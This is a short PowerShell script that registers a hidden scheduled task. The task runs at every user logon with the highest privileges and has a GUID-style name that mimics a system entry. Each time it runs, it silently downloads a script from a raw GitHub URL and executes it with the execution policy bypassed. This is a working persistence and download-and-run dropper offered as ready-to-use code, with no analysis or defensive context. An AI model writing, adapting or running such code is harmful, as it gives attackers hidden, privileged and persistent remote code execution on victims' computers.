$powershellcode = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
$download = "(New-Object Net.WebClient).DownloadString('$powershellcode')"
$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX $download }"

$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "{FE75EAA7-323E-4B5C-B3B3-86C0B79424E7}"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
$task_desc = "Scheduled task to execute script"
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable

Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
